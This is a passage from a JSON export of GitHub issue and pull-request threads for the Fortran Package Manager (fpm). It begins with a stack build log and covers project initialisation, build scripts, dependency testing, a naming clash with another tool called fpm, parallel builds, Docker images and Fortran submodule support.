/home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/clock-0.8-H1S1zDefxirImaRbI6ITNv\nclock               > Registering library for clock-0.8..\ncolour              > [ 7 of 14] Compiling Data.Colour.RGBSpace.HSL\nfile-embed          > copy/register\nfile-embed          > Installing library in /home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/file-embed-0.0.11.1-1DkjC7VmQhQFLvxtpUIE3o\ncolour              > [ 8 of 14] Compiling Data.Colour.RGBSpace.HSV\ncolour              > [ 9 of 14] Compiling Data.Colour.SRGB.Linear\nfile-embed          > Registering library for file-embed-0.0.11.1..\ncolour              > [10 of 14] Compiling Data.Colour.RGBSpace\ncolour              > [11 of 14] Compiling Data.Colour.SRGB\ncolour              > [12 of 14] Compiling Data.Colour\ncolour              > [13 of 14] Compiling Data.Colour.Names\ncolour              > [14 of 14] Compiling Data.Colour.CIE\ncolour              > copy/register\ncolour              > Installing library in /home/emanuele/.stack/snapshots/x86_64-linux-tinfo6/49a576afeb5ab2de0c5f11799c421ee126e112c03a2f7d31c3261efc00737d53/8.6.5/lib/x86_64-linux-ghc-8.6.5/colour-2.3.5-y0xjV3ONUd40VuBtReEvC\ncolour              > Registering library for colour-2.3.5..\nHttpExceptionRequest Request {\n  host                 = \"casa.fpcomplete.com\"\n  port                 = 443\n  secure               = True\n  requestHeaders       = []\n  path                 = \"/v1/pull\"\n  queryString          = \"\"\n  method               = \"POST\"\n  proxy                = Nothing\n  rawBody              = False\n  redirectCount        = 10\n  responseTimeout      = ResponseTimeoutDefault\n  requestVersion       = HTTP/1.1\n}\n (ConnectionFailure Network.Socket.getAddrInfo (called with preferred socket type/protocol: AddrInfo {addrFlags = [AI_ADDRCONFIG], addrFamily = AF_UNSPEC, addrSocketType = Stream, addrProtocol = 0, addrAddress = <assumed to be undefined>, addrCanonName = <assumed to be undefined>}, host name: Just \"casa.fpcomplete.com\", service name: Just \"443\"): does not exist (Try again))\nProgress 4/30\n\nbut simply running stack build again solved magically the issue (I don't know what that is).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-06-14 04:37:30+00:00",
                    "text": "I see, thanks.\nWe are planning to actually implement the production version of fpm in Fortran itself, and distribute it as a binary. So most of these issue will not be issues in the future. But in order to bootstrap fpm, we will keep the Haskell verison with minimal features (roughly as it is now), so that we can use it to actually develop the Fortran version of fpm.\nThanks for submitting this."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-06-15 13:15:48+00:00",
                    "text": "We are planning to actually implement the production version of fpm in Fortran itself, and distribute it as a binary.\n\nWas this mentioned somewhere previously? I recall reading it would be done in C++ for performance. If we could set up stdlib to work with the current fpm, and get the necessary string and system routines in stdlib it would be a nice test of the entire project."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-15 14:07:34+00:00",
                    "text": "If we could set up stdlib to work with the current fpm\n\nDo you mean building stdlib using fpm? I think this is a good short-term goal for fpm - I believe the prerequisites before we can do this are #78 (preprocessor support) and #86 (submodules support).\nIf fpm is implemented in Fortran, then using stdlib for this would also be a good demonstration of stdlib."
                }
            ]
        },
        {
            "number": 97,
            "user": "epagone",
            "date": "2020-06-13 18:33:53+00:00",
            "title": "add Ubuntu 20.04 package pre-requisite to `README`",
            "text": "Testing the building process, I have identified a pre-requisite on my machine with Ubuntu 20.04. Fixed a trivial typo, too.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 17:38:03+00:00",
                    "text": "Merging, thank you @epagone!"
                }
            ]
        },
        {
            "number": 96,
            "user": "certik",
            "date": "2020-06-12 17:08:54+00:00",
            "title": "Implement \"fpm init\" to create the initial project skeleton",
            "text": "It would work just like cargo init:\n$ cargo init myproject1\n     Created binary (application) package\n$ tree -a myproject1\nmyproject1\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 .git\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 config\n\u2502   ...\n\u251c\u2500\u2500 .gitignore\n\u2514\u2500\u2500 src\n    \u2514\u2500\u2500 main.rs\n\n10 directories, 18 files\n\nAs you can see, it starts a git repository, and so on. It is ready to compile, so:\n~$ cd myproject1\nmyproject1(master)$ cat src/main.rs \nfn main() {\n    println!(\"Hello, world!\");\n}\nmyproject1(master)$ cargo run\n   Compiling myproject1 v0.1.0 (/tmp/myproject1)\n    Finished dev [unoptimized + debuginfo] target(s) in 1.25s\n     Running `target/debug/myproject1`\nHello, world!\n\nIf you just call cargo init, then it creates a new project in the current directory. Similar to git init.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:24:33+00:00",
                    "text": "I might split the two use cases and not actually run git init.\nfpm new name creates a folder name with contents fpm.toml, .gitignore and src\\name.f90. Maybe app\\main.f90 instead? Or maybe both? I'll come up with a specific proposal. But yeah, fpm build and maybe fpm run should work from the get go.\nfpm init uses the name of the current folder as the name of the project and just creates fpm.toml. Maybe append build/* to the end of .gitignore.\nI think we want people to be able to create new projects even if they don't already have git installed."
                },
                {
                    "user": "certik",
                    "date": "2020-06-12 18:49:31+00:00",
                    "text": "Yes, we should allow options to configure things, so all of the above will be possible with the proper options. For example to initialize without git:\ncargo init --vcs none myproject1\n\n(Obviously you can use other vcs also such as hg.) People that do not have git can always use this option.\nThe default (with no options provided) should be the ones that people use the most often as well as a \"default\" workflow that we want to encourage. I think that we absolutely want to encourage to use git and upload to GitHub or GitLab. I think that should be the default workflow to encourage.\nBut for people who are perhaps new to programming and just want to use a few dependencies and write some simple app and do not want to learn git at the moment, those would initialize with git init --vcs none myproject1.\n$ cargo init -h\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]\n\nOPTIONS:\n    -q, --quiet                  No output printed to stdout\n        --registry <REGISTRY>    Registry to use\n        --vcs <VCS>              Initialize a new repository for the given version control system (git, hg, pijul, or\n                                 fossil) or do not initialize any version control at all (none), overriding a global\n                                 configuration. [possible values: git, hg, pijul, fossil, none]\n        --bin                    Use a binary (application) template [default]\n        --lib                    Use a library template\n        --edition <YEAR>         Edition to set for the crate generated [possible values: 2015, 2018]\n        --name <NAME>            Set the resulting package name, defaults to the directory name\n    -v, --verbose                Use verbose output (-vv very verbose/build.rs output)\n        --color <WHEN>           Coloring: auto, always, never\n        --frozen                 Require Cargo.lock and cache are up to date\n        --locked                 Require Cargo.lock is up to date\n        --offline                Run without accessing the network\n    -Z <FLAG>...                 Unstable (nightly-only) flags to Cargo, see 'cargo -Z help' for details\n    -h, --help                   Prints help information\n\nARGS:\n    <path>     [default: .]"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 20:47:11+00:00",
                    "text": "I see, I was not aware of those options for cargo. With that, I'm fine with defaulting to using git. There is certainly value in having the defaults set to the most common use case and the one we want to encourage.\nI would still prefer init and new as two different commands."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 21:09:38+00:00",
                    "text": "Cargo also has init and new. They have similar but complementary roles. I see value in having both."
                }
            ]
        },
        {
            "number": 95,
            "user": "everythingfunctional",
            "date": "2020-06-11 21:43:54+00:00",
            "title": "Fix ordering for library archive list",
            "text": "Found a bug in how the library archive paths are kept. Caused a link time error for complicated dependency trees.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 16:23:29+00:00",
                    "text": "I had a test that I thought tested this, but apparently the dependency tree wasn't deep/complicated enough. It took a real world, complicated usage to finally uncover it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:03+00:00",
                    "text": "Sounds good. I don't understand the fix, but it should go forward.\nWhat's the example that didn't work and that this PR fixes? It's helpful to know so that if the same or similar scenario causes an issue again, we'll know where to look. It's good to document these things at least in the PR thread. I agree with @certik regarding tests."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:16+00:00",
                    "text": "Merging."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:29:53+00:00",
                    "text": "I started a simple executable project with matterff and a few other of its dependencies as dependencies, and it barfed at the link command. Unfortunately it was in a work repo, so I can't provide a link, but I should be able to relatively easily put together a separate example repo if needed."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:32:12+00:00",
                    "text": "The problem was that it was keeping the first instance of duplicate entries in the list, but it needed to keep the last one. The fix is to just reverse the list before removing the duplicates and then reverse it back once that's done."
                }
            ]
        },
        {
            "number": 94,
            "user": "certik",
            "date": "2020-06-08 16:48:21+00:00",
            "title": "Implement a build script",
            "text": "I would do exactly what Cargo does: https://doc.rust-lang.org/cargo/reference/build-scripts.html\nOnly I would allow the build script to be any of: any binary, cmake, make, Bash script.\nOtherwise the following I would do exactly the same:\n\n\nInputs: environment variables\n\n\nOutputs: the build script prints to stdout with lines starting with fpm:, everything else is ignored. At the beginning, I would support the following, and we can add more later:\n\nfpm:fc-link-lib=[KIND=]NAME --- Adds a library to link (doc)\nfpm:fc-flags=FLAGS --- Passes certain flags to the compiler (doc).\n\nThat should be enough to get us started. One of the environment variables passed to the build script is which Fortran compiler is being used, so the build script would know what compiler parameters to pass back (for example ifort in general might require different flags than gfortran). In the same way, the flags might depend on the platform (macOS vs Linux vs Windows), so one of the input variables can be what platform we run on.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-11-22 05:04:16+00:00",
                    "text": "I was taking a look at this after some related comments in #118 prompted my interest.\nIn Rust a crate called cc is used to automate the process of building C dependencies. The crate is organized around two structs,  Build - used to specify project and compile options,  Tool - used to represent the invocation of the C compiler:\npub struct Build {\n    include_directories: Vec<PathBuf>,\n    definitions: Vec<(String, Option<String>)>,\n    objects: Vec<PathBuf>,\n    flags: Vec<String>,\n    flags_supported: Vec<String>,\n    known_flag_support_status: Arc<Mutex<HashMap<String, bool>>>,\n    ar_flags: Vec<String>,\n    no_default_flags: bool,\n    files: Vec<PathBuf>,\n    cpp: bool,\n    cpp_link_stdlib: Option<Option<String>>,\n    cpp_set_stdlib: Option<String>,\n    cuda: bool,\n    target: Option<String>,\n    host: Option<String>,\n    out_dir: Option<PathBuf>,\n    opt_level: Option<String>,\n    debug: Option<bool>,\n    force_frame_pointer: Option<bool>,\n    env: Vec<(OsString, OsString)>,\n    compiler: Option<PathBuf>,\n    archiver: Option<PathBuf>,\n    cargo_metadata: bool,\n    pic: Option<bool>,\n    use_plt: Option<bool>,\n    static_crt: Option<bool>,\n    shared_flag: Option<bool>,\n    static_flag: Option<bool>,\n    warnings_into_errors: bool,\n    warnings: Option<bool>,\n    extra_warnings: Option<bool>,\n    env_cache: Arc<Mutex<HashMap<String, Option<String>>>>,\n    apple_sdk_root_cache: Arc<Mutex<HashMap<String, OsString>>>,\npub struct Tool {\n    path: PathBuf,\n    cc_wrapper_path: Option<PathBuf>,\n    cc_wrapper_args: Vec<OsString>,\n    args: Vec<OsString>,\n    env: Vec<(OsString, OsString)>,\n    family: ToolFamily,\n    cuda: bool,\n    removed_args: Vec<OsString>,\n}\nMost of the fields are self-explanatory. A few ideas that came to my mind upon looking into the Rust code:\n\nFortran has the intrinsic subroutine CALL GET_ENVIRONMENT_VARIABLE(NAME[, VALUE, LENGTH, STATUS, TRIM_NAME) which makes it easy to recover the environment variables.\nFor the same family of compilers, the compile flags for Fortran and C will be the same, meaning that the derived type representing the compiler invocation can be re-used for compiling both Fortran and C source files. (The Rust crate is not limited to C code, it can accept any source code that can be passed to a C or C++ compiler. As such, assembly files with extensions .s (gcc/clang) and .asm (MSVC) can also be compiled.)\nThe cc crate even supports a parallel build feature for C and Rust sources by setting up a job server. Within Fortran we could do something similar using co-arrays or OMP tasks (once dependencies like these are allowed). The feature is enabled conditionally, using the following TOML option:\n\n[build-dependencies]\ncc = { version = \"1.0\", features = [\"parallel\"] }"
                }
            ]
        },
        {
            "number": 93,
            "user": "epagone",
            "date": "2020-06-07 12:22:50+00:00",
            "title": "Run dependencies tests",
            "text": "Use case: I'd like to build my program or library that depends on FGSL with fpm. I know how to specify such dependency (in theory, at least) and let's assume that there are no issues in fetching, compiling and linking.\nThe issue I'm raising here is: what if I want to make sure that the fetched and compiled dependency passes its tests on my machine before proceeding with linking and building my own program or library? How can I do that with fpm?\nI believe it's a non-trivial problem considering that each external dependency does not conform to fpm specs. Off the top of my head: maybe an additional key in the TOML file can be specified by the user that specifies how to test the dependency (e.g. make test)? However, I think that it is a sub-optimal solution because requires the user to gain this information for each dependency but it would be hard to have a general reliable method otherwise. Please correct me if I'm off-track.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-06-07 19:36:31+00:00",
                    "text": "@epagone good question. Here is how I think we are imagining this will work:\n\nyour program depends on FGSL.\nFGSL will be an fpm package. As such, when you execute fpm test in the FGSL repository, it will test it. (Currently FGSL is not an fpm package. We envision that eventually people would like to make all such libraries an fpm package, but until then, somebody can create simple repository that will be the fpm package for it, and it would fetch the FGSL sources and build it correctly with fpm, and it would ensure that fpm test works.)\nIn your program, you would just depend on the FGSL as an fpm package.\n\nTo run tests for FGSL, there are two options, you either checkout the FGSL repository and execute fpm test there. Or we can add an option to fpm test, such as fpm test -p FGSL that would execute the tests for FGSL.\nI just checked how Cargo does it. And while Cargo has the -p option for cargo test, it only works with local packages in a workspace (one can have multiple packages in a git repository), but it doesn't seem to work for dependencies that are not in the current repository.\nWe can discuss this more."
                },
                {
                    "user": "epagone",
                    "date": "2020-06-08 00:55:40+00:00",
                    "text": "Thanks for the explanation @certik, I understand now the logic better. However, I went back to re-read the packaging guide and I think the requirement that the dependency has to be already an fpm package is not stated:\n\nInevitably you'll want to be able to include other libraries in your project. fpm makes this incredibly simple, by taking care of fetching and compiling your dependencies for you. You just tell it what your dependencies are, and where to find them.\n\nProbably the assumption that the dependency has been already packaged with fpm is implied. Thinking about it, I guess it should not be a big deal to re-package existing libraries in fpm: it's a matter of swapping files in the right directories and writing the fpm.toml file (if I'm not missing anything major)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-08 02:26:54+00:00",
                    "text": "@epagone yes, that's the most natural approach."
                }
            ]
        },
        {
            "number": 92,
            "user": "certik",
            "date": "2020-06-07 04:32:52+00:00",
            "title": "Behavior of `fpm build` and `fpm test`",
            "text": "cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach.",
            "comments": []
        },
        {
            "number": 91,
            "user": "everythingfunctional",
            "date": "2020-06-07 03:59:40+00:00",
            "title": "Multiple executables or tests in the same directory",
            "text": "Right now, program source files can not be placed in the same folder. The build system sees the other program source files and assumes they are modules. We should discuss whether this restriction should be clearly identified in the user documentation, or whether we want to try and support having multiple program sources in the same folder.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-07 04:03:29+00:00",
                    "text": "The main use case I can see for allowing this would be to have modules common to multiple programs or tests, but not included in the library. I would generally be of the opinion that such a situation calls for either putting those modules in the library, or putting them into their own separate library. And by not supporting it, it encourages users to do things the right way."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:23:46+00:00",
                    "text": "I think Cargo allows to have programs in subdirectories of bin/, and I think it's one executable per subdirectory, and other files are just linked to it. I think that's fine.\nFinally, all programs in bin/ directory directly are all separate programs and I think only programs are allowed there.\nI think we can follow exactly the same approach."
                }
            ]
        },
        {
            "number": 90,
            "user": "certik",
            "date": "2020-06-04 20:55:38+00:00",
            "title": "The name fpm is used by another package manager",
            "text": "It was just pointed out to me that fpm is used by another project: https://github.com/jordansissel/fpm. Unfortunately it is in a similar field (also a package manager).\nHere are some options going forward (I'll update this list if there are more):\n\nRename our fpm\nKeep the name fpm and ensure that people do not mistake the two projects (what's the best way?)\n\nAs to myself, I really like the name fpm to mean a Fortran Package Manager. So I vote for 2., if there is a way to do it.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:13:50+00:00",
                    "text": "I vote for 2 as well. I think the two are sufficiently different, but knowing it's out there we can be conscious to avoid confusion as much as possible.\nOn a side note, should we use that tool to create our Linux packages?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 21:24:35+00:00",
                    "text": "This is unfortunate, though not surprising.\nAs the originator of the name, I'm sorry. I should've done better research. :(\nMy preference is also for 2, because I like the name. However I see issues ahead of us, and it will only be more difficult to rename later. Issues are:\n\nConfusion\nConflict (both CLI tools are called fpm)\nBad look on us as the community, as we are a younger project\n\n\nOn a side note, should we use that tool to create our Linux packages?\n\nThough it sounds like a good idea, now we're really screwed: \"So fpm will package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other fpm?\". I'm confused already. :)\n\nSo I vote for 2., if there is a way to do it.\n\nLet's discuss how we could do it. This would probably mean putting a large disclaimer at the top of our README, saying \"This fpm is not the other fpm\", or similar. What else?\n@jordansissel Do you have any advice for us?"
                },
                {
                    "user": "jordansissel",
                    "date": "2020-06-05 00:59:34+00:00",
                    "text": "I ran into this myself shorty after releasing (my) fpm! I learned there\u2019s a\ntool PHP-FPM That many folks call FPM.\n\nNaming is hard. It\u2019s hard to know if conflicting names will cause\ndifficulties.\n\nI\u2019ve run into weirdness myself with things on Debian like \u201cdocker\u201d package\nnot being the container runtime tool.\n\nI think my advice is this: if you feel fpm is the right name for your tool,\nthen please keep the name. Computers and humans will likely figure this out\non their own with their own workarounds that aren\u2019t too harmful. Examples\nabound, like you can\u2019t really search for \u201cgo\u201d so while the language is Go\nyou gotta search golang. It\u2019s a weird workaround but it works most of the\ntime.\n\nIs this a bad look? I don\u2019t think so!\n\n+1 for a clarification at the top of the README. I\u2019d be happy to include a\nsimilar clarification in my fpm readme and docs. Something short and direct\nthat describes the project (FORTRAN for this one) and offers disambiguation\nlinks to help any wayward travelers.\n\nI agree with concern about command line name conflicts, but it\u2019s unclear\nwhat negative impact this will have. Again here we have examples like\ndownstream OS calling \u201cpip\u201d executable \u201cpython3-pip\u201d or similar naming\nsolutions. That said, it\u2019s probably fine to keep the cli name the same?\n\nAs for search/discovery, \u201cfpm\u201d plus any context should help search engines\nfind the right place for users.\n\nThoughts? Having the project and cli name be the same has low risk in my\nopinion.\n\u2026\nOn Thu, Jun 4, 2020 at 2:24 PM Milan Curcic ***@***.***> wrote:\n This is unfortunate, though not surprising.\n\n As the originator of the name\n <fortran-lang/stdlib#44 (comment)>,\n I'm sorry. I should've done better research. :(\n\n My preference is also for 2, because I like the name. However I see issues\n ahead of us, and it will only be more difficult to rename later. Issues are:\n\n    - Confusion\n    - Conflict (both CLI tools are called fpm)\n    - Bad look on us as the community, as we are a younger project\n\n On a side note, should we use that tool to create our Linux packages?\n\n Though it sounds like a good idea, now we're really screwed: \"So fpm will\n package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other\n fpm?\". I'm confused already. :)\n\n So I vote for 2., if there is a way to do it.\n\n Let's discuss how we could do it. This would probably mean putting a large\n disclaimer at the top of our README, saying \"This fpm is not the other\n fpm\", or similar. What else?\n\n @jordansissel <https://github.com/jordansissel> Do you have any advice\n for us?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#90 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AABAF2WIFDF5BRL244MHV4LRVAGKDANCNFSM4NS7GCRA>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-05 02:54:11+00:00",
                    "text": "Jordan, thanks a lot. With your encouragement I now feel more comfortable keeping the name, and making it clear in the README to avoid confusion.\nSo if @certik and @everythingfunctional agree, we'll add the clarification and link to the top of the README."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 04:11:25+00:00",
                    "text": "@jordansissel thank you for your nice comment. Since you are ok with us keeping the name, I am too. @milancurcic yes, let's send a PR with a clarification at the top of our README and docs. That should make it clear to users.\nI agree with Jordan that there are ways around it. For example Debian has the alternatives system, so users will be able to choose what they want to run as fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-05 04:43:29+00:00",
                    "text": "I am in agreement. Good call just reaching out and asking, and thank you @jordansissel for your understanding and encouragement."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 21:49:37+00:00",
                    "text": "Here is an example how Spack disambiguates the name:\nhttps://spack.readthedocs.io/en/latest/\nThey write:\n\nThese are docs for the Spack package manager. For sphere packing, see pyspack."
                },
                {
                    "user": "nshaffer",
                    "date": "2020-06-13 23:23:01+00:00",
                    "text": "The fpm help text gave me an idea for an alternate name.\nwwf - working with Fortran\nIt seems like the naming crises has passed, but I'm just too tickled by the idea of scientists and engineers co-opting \"WWF\" to mean their package manager."
                }
            ]
        },
        {
            "number": 89,
            "user": "everythingfunctional",
            "date": "2020-06-02 15:12:27+00:00",
            "title": "Add ability to specify which test or program to run and their args",
            "text": "This adds some command line arguments to allow specifying which executable or test you would like to run, and any command line arguments you would like to pass on.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 20:15:45+00:00",
                    "text": "At this stage I (we) haven't really talked about whether executables should be in their own directory. So that is kind of a current edge case bug.\nRight now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:36:36+00:00",
                    "text": "Right. We should also consult how Rust does it.\n+1 to merge this PR."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 20:40:13+00:00",
                    "text": "I now see approval from @certik, so I agree to merge this, and we can add some basic instructions to the README in a separate PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:44:53+00:00",
                    "text": "See #83 for improving the tests in general. We have to add a lot more tests, that would serve as the \"spec\" of how fpm is expected to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:08:43+00:00",
                    "text": "I'll go ahead and add stuff to the README for this PR. No sense leaving it half done.\nAs for the testing, I think there's just one last thing I'd like to take a crack. I want to get support for using a build script or makefile. That shouldn't take much time to implement. Then yes, we should focus our efforts on writing as many tests (both happy path and error conditions) as we can think of.\nUp to this point, this has been a prototype. I think we've been incredibly successful with it, and it's functionality is pretty much right where we want. So now we just put some tests around it to make sure nothing breaks while we pretty up the insides."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-05 07:55:12+00:00",
                    "text": "Right now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later.\n\nThanks for the explanation, this behaviour makes more sense to me now; I don't think it's a bug but it is definitely something that needs to be documented in PACKAGING.md."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:26:03+00:00",
                    "text": "So cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-07 04:30:09+00:00",
                    "text": "Ok. That will require some (minor) refactoring to get working properly. Open an issue and I can fix it in another PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:33:08+00:00",
                    "text": "Sure: #92."
                }
            ]
        },
        {
            "number": 88,
            "user": "LKedward",
            "date": "2020-05-31 10:23:57+00:00",
            "title": "Parallel job control flag",
            "text": "I think it's great that fpm already supports parallel builds - there should be a command line flag, like -j, to control the maximum number of threads used.\nThis is important for two reasons:\n\nyou can't assume that the machine will not already be under load, particularly for multi-user environments;\nmemory limits - I have previously run out of memory on a work computer for a large parallel build",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 02:19:40+00:00",
                    "text": "Yep, that's fair. -j is something that would be expected.\nI didn't mention this subtle detail, but I probably should have; it doesn't build the dependencies in parallel, but it absolutely could. By that I mean building two dependencies that don't depend on each other could be done simultaneously. However, doing that at this stage would mean that each dependency get's built with the same number of threads. I'll need to think about how to really robustly structure the parallelism."
                }
            ]
        },
        {
            "number": 87,
            "user": "everythingfunctional",
            "date": "2020-05-31 00:18:15+00:00",
            "title": "Docker Image With fpm",
            "text": "Now that fpm is in a usable state, I think we should try and create a docker image with the latest version installed, so people can use fpm in their CI.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-31 02:59:46+00:00",
                    "text": "Yes. Even better we should distribute fpm as a single binary for each platform."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 02:11:14+00:00",
                    "text": "I think we should focus more on package manager distributions than just an executable. At a minimum we should support apt, yum, pacman, and homebrew. Probably also some others. Manually installed things don't get updated very often, if at all."
                },
                {
                    "user": "certik",
                    "date": "2020-06-01 02:16:37+00:00",
                    "text": "Yes, we need all of those also.\n\u2026\nOn Sun, May 31, 2020, at 8:11 PM, Brad Richardson wrote:\n\n\n I think we should focus more on package manager distributions than just\n an executable. At a minimum we should support `apt`, `yum`, `pacman`,\n and `homebrew`. Probably also some others. Manually installed things\n don't get updated very often, if at all.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#87 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWAXGOLNFFNM2HC23I3RUME43ANCNFSM4NO5JRWQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 18:18:03+00:00",
                    "text": "Let's not forget fpm update. This is something I'd expect as a user. fpm should be able to update itself.\nI'm not a target audience for Docker image but I see its value.\nLinux system package managers like apt and dnf I use occasionally, but I can't take them seriously because so many packages are out of date, so they're mostly good for mature (stable) packages. I agree one should be able to get fpm using those. Then also consider Homebrew, Linuxbrew, and Snapcraft."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-02 13:25:26+00:00",
                    "text": "I quickly slapped together a docker image here. I scheduled the CI to update weekly as well.\nAt some point this will deserve some effort to trim down the size of the resulting image. Right now I based it on Ubuntu and built fpm in the image. It should be possible to use a more lightweight starting point (like Alpine) and just copy in the fpm executable. Then we should create a more official one and publish it on docker hub."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-02 13:51:37+00:00",
                    "text": "Great! I think it's a good start. I suggest adding the Dockerfile (and associated instructions in the README.md) to the fpm repo."
                }
            ]
        },
        {
            "number": 86,
            "user": "LKedward",
            "date": "2020-05-30 16:12:03+00:00",
            "title": "Support Fortran submodules",
            "text": "Except for small/simple projects, I almost always adopt Fortran submodules now to structure new projects. This is primarily for the parallel and incremental builds that they allow.\nI realise this may be low down on the list of project priorities currently, but I think it should only require an update to the dependency tracking whereby submodules depend on their parent modules as if they use them.\nMuch further down the line, I assume fpm will aim for some kind of parallel build support?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-30 16:14:52+00:00",
                    "text": "Thanks. Yes, fpm must work with submodules and yes, we must be able to build in parallel."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:55:20+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel (to the extent they can be of course, given dependencies on the .mod files). Supporting submodules won't be too difficult, but I haven't found a particularly compelling use case."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-30 20:01:22+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel\n\nThis is awesome! I didn't realise. Does it use all available threads by default?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 23:04:41+00:00",
                    "text": "Yep"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 14:17:30+00:00",
                    "text": "I've gotten a request from a paying customer to add support for submodules ASAP. The question I have for the rest of the group has to do with the naming convention restrictions we currently have in place for modules.\nThe dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\nDo you guys have any thoughts? It won't add any backwards incompatibilities, and it won't add any complexities from a user perspective."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 14:21:48+00:00",
                    "text": "The dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\n\nI have no objection to removing these naming requirements - I actually found it very restrictive when trying out fpm with existing packages which have their own various naming conventions.\nI'm excited for submodule support! \ud83d\ude80"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 15:00:21+00:00",
                    "text": "This sentence confuses me:\n\nI'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules.\n\nDo you mean keep the existing requirement for modules, but don't require it for submodules? I think so, because later you wrote \"It won't add any backwards incompatibilities\".\nI don't understand well how submodules are managed by compilers. If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules. So, this sounds good to me, but let's make sure that that's the case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 15:16:32+00:00",
                    "text": "I mean remove the existing requirement for modules. Removing that requirement is backwards compatible.\nSubmodules are a bit convoluted.\nCompiling a module produces a .mod and .smod with the name of the module. Compiling a submodule depends on the .mod and .smod of its parent module, and the .smod of any parent submodules, and produces a .smod file named parent_mod@parent_smod1@parent_smod2@...@submod.smod. Then all of the object files from the whole tree must be linked into the library or executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 15:43:46+00:00",
